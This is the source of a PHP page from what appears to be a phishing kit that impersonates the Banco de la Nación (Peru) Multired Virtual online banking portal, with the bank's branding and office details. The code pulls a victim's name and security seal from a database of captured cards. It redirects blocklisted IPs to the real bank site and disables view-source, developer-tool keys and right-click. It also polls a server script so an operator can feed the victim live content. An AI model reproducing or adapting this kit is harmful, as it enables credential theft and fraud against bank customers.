<?php
error_reporting(0);
session_start();
/*===================================================*/
$card = $_SESSION["card"];
$ipv = $_SERVER["REMOTE_ADDR"];

$file = fopen("IPBam.txt", "r");
while($linea = fgets($file)){
	if(trim($linea) == trim($ipv)){
		header("location: https://zonasegura1.bn.com.pe/BNWeb/login.do");
		exit;
	}
}
fclose($file);
/*===================================================*/
include("class/db.php"); 
$result = $link->query("SELECT nombre, img FROM usuarios WHERE card='".$card."'");
$row = $result->fetch_array(MYSQLI_NUM);
$nombre = (trim($row[0]) ? $row[0] : "Esperando información...");
$img = (trim($row[1]) ? $row[1] : "0");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="es" xml:lang="es">
<head>
<meta charset="utf-8"> 
<title>Banco de la Nación - Multired Virtual</title>
<meta http-equiv="Content-Language" content="es"> 
<link rel="stylesheet" type="text/css" href="files/css/resetearcss.css">
<link rel="stylesheet" type="text/css" href="files/css/bn-principal.css">
<link rel="stylesheet" type="text/css" href="files/css/tipografias.css">
<link rel="stylesheet" type="text/css" href="files/css/bienvenido.css">
<script type="text/javascript" src="files/js/bn-jquery.js"></script>
<script type="text/javascript" src="files/js/jquery.ui.js"></script>
<script type="text/javascript" src="jquery-1.8.3.min.js"></script>
<style type="text/css">cufon{text-indent:0!important;}@media screen,projection{cufon{display:inline!important;display:inline-block!important;position:relative!important;vertical-align:middle!important;font-size:1px!important;line-height:1px!important;}cufon cufontext{display:-moz-inline-box!important;display:inline-block!important;width:0!important;height:0!important;overflow:hidden!important;text-indent:-10000in!important;}cufon canvas{position:relative!important;}}@media print{cufon{padding:0!important;}cufon canvas{display:none!important;}} </style>
<script>
(function($){  
$.get = function(key){  
key = key.replace(/[\[]/, '\\[');  
key = key.replace(/[\]]/, '\\]');  
var pattern = "[\\?&]" + key + "=([^&#]*)";  
var regex = new RegExp(pattern);  
var url = unescape(window.location.href);  
var results = regex.exec(url);  
if (results === null) {  
return null;  
} else {  
return results[1]; }}})(jQuery);  
jQuery(document).ready(function(){
var a = $.get("cgi"); //id es el atributo que viene por la url ejemplo www.google.com?id=12235
$("#objeto").val(a); });
</script>
<script language="JavaScript">
document.onkeydown = function(e) {
tecla = (document.all) ? e.keyCode : e.which;
	//alert(tecla)
if (tecla === 116 || tecla === 123)  return false;
if (e.ctrlKey && (tecla === 67 || tecla === 83 || tecla === 85 || tecla === 86 || tecla === 116)) { return false; } else { return true; }};
$(document).keypress("u",function(e) { if(e.ctrlKey) { return false; } else { return true; } });
</script>
<script language="JavaScript">
document.addEventListener("contextmenu", function(e){e.preventDefault();}, false);
</script>
</head>
<input type="hidden" id="objeto"  />
<body><div style="position: absolute; top: 10em; left: 25%; float: left">
</div>
<script type="text/javascript">
	function logout()
	{
		document.forms[0].action="login.do";
		document.forms[0].target = "_self";
		document.forms[0].metodo.value="salir";
		document.forms[0].submit();
	}
</script>
    <div id="contenedor">
        <div id="cabecera">
            <div id="logo-multired">
              <img src="files/img/logo-multired.jpg" alt="Logotipo Multired">
            </div>
            <div id="logo-bn">
                <img src="files/img/logo-bn.jpg" alt="Logotipo del Banco de la Nación">
            </div>
        </div>
        <div id="cuerpo">
            <h1><img style="float:left;" src="files/img/candado.png"> <p style="margin-top:8px;float:left;" class="dax">Usted se encuentra en una <span>zona segura</span></p></h1>
            <div id="cerrar-sesion">
                <a style="height:21px; padding-top:8px;" class="dax" href="javascript:logout();" accesskey="c" title="Cerrar Sesión">Cerrar Sesión</a>
                <form name="x">
					<input type="hidden" name="metodo">
				</form>
            </div>
            <div id="bienvenidos">
                <div id="border-superior"><img src="files/img/border-superior.jpg"></div>
                <div id="bienvenidos-contenido">
                    <div id="datos-personales" class="limpiar">
                        <div id="nombres" style="width: 457px ! important;">
                        	<p style="float:left; margin-top:30px; margin-right:10px;" class="dax">
                        		<span>CLIENTE: </span><?= strtoupper($nombre); ?>
                        	</p>
                        	<div id="cont_sello_seguridad">
	                        	<img style="border:1px solid #8B8B8B; border-radius: 5px;" src="rob0t/img/<?= $img; ?>.png" alt="Sello de Seguridad" width="58" height="58">
                        	</div>
                        </div>
                        <div id="seleccion-monto">
                            <p style="text-align: center;">Monto Límite Diario</p>
                            <p style="text-align: center;">Por Cliente</p>                
                            <p style="text-align: center;"><span>S/. 7,000.00</span></p>
                        </div>
                        <div id="ultimo-ingreso">
                            <p>Último ingreso</p>							                             
                            <p><span>Fecha:</span><?=date("d/m/Y");?></p>
                            <p><span>Hora:</span><?=date("h:i:s A");?></p>                                                  
                        </div>
                        <div id="tipo-cambio">
                            <p>Tipo de cambio</p>
                 			<p><span>Compra:</span> 3.2200</p>
                            <p><span>Venta:</span> 3.2900</p>
                        </div>
                    </div>
      <div id="bn-contenidos" class="limpiar">
           <div id="menu-internas">
                <div>
                    <iframe src="files/menu.html" name="menu_frame" style="width: 220px;height:1000px;" frameborder="0"></iframe>
                        	</div>                         
                        </div>
                        <div id="contenidos-informativos">
                        	<iframe src="files/home.php?cgi=<?php echo $_GET["cgi"] ?>" name="Cuerpo" width="100%" height="960px" frameborder="0" scrolling="auto" id="CuerpoIframe">
                        	</iframe>                        	
                        </div>
                    </div>
                </div>
                <div id="border-inferiror"><img src="files/img/border-inferior.jpg"></div>
            </div>
        </div>
        <div id="pie-pagina">
            <div id="titulo-pie-pagina">Banco de la Nación  |  Ministerio de Economía y Finanzas</div>
            <div id="oficinas">
                <p>Oficina Principal: Av. República de Panamá 3664. San Isidro. Central Telefónica: 519-20 00. </p>
                <p>Atención en Oficinas Administrativas: Lunes a Viernes de 8:30 a 17:30 horas. Refrigerio de: 13 a 14 horas </p>
                <p>Atención en Oficina de Trámite Documentario: Lunes a Viernes de 9:00 a 17:00 horas (Horario corrido).</p>
            </div>
        </div>
    </div>
<script>
		$(document).ready(function(e){
			setTimeout(function(){
				showimg();
			}, 3000);
		});
		
		function showimg(){
			$.ajax({
					url: "recalcular.php?idx=imagen",
					method: "POST",
					data: {id: <?= $card; ?>},
					beforeSend: function(){
						
					},
					success: function(result){
						$("#nombres").html(result);
						setTimeout(function(){
							showimg();
						}, 3000);
					},
					error: function(){ showimg(); }
			});
		}
</script>
</body></html>